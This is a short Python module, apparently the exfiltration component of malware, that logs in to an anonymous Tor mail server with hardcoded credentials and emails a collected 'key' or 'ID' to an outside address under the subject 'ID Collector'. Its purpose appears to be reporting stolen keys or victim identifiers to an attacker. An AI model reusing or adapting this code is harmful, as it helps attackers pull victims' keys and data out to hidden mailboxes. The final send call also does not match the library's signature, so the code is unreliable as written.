#!/usr/bin/env python
__author__ = "T0x1cEnv31ope"
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText


class Sender(object):
    # MAIL_SERVER_DOMAIN = 'mail2torx3jqgcpm.onion'
    MAIL_SERVER_DOMAIN = 'mail2tor.onion'
    PORT = 25

    def __init__(self):
        self.init()

    def init(self):
        self._seeder = MIMEMultipart()
        self._from = 't0x1cenv31ope@mail2tor.com'
        self._pwd = '~!@#$%^&*()_+-=Password?'

    @staticmethod
    def connect_to_mail_server(domain, port):
        return smtplib.SMTP(domain, port)

    def login(self):
        self.SMTP.login(self._from, self._pwd)

    def prepare_thread(self, to, key):
        self._seeder['From'] = self._from
        self._seeder['To'] = to
        self._seeder['Subject'] = str.format("ID Collector: {0}", key)

    def send_mail(self, to, saved_key):
        self.prepare_thread(to, saved_key)
        message = "A new ID has been collected, please verify data!"
        paragraph_context = str.format("<p>{0}</p>", message)
        root_context = str.format("<html><body><p>{1}</p></br>{0}</body></html>", paragraph_context, saved_key)
        self._seeder.attach(MIMEText(root_context))
        self.authenticate_and_send(to)
        self.SMTP.quit()

    def authenticate_and_send(self, to):
        self.SMTP = self.connect_to_mail_server(self.MAIL_SERVER_DOMAIN, self.PORT)
        self.SMTP.ehlo()
        self.SMTP.starttls()
        self.SMTP.ehlo()
        self.login()
        self.SMTP.send(self._from, to, self._seeder.__str__())


if __name__ == "__main__":
    smtp = Sender()
    smtp.send_mail("sysmurff@gmail.com", "abc123")
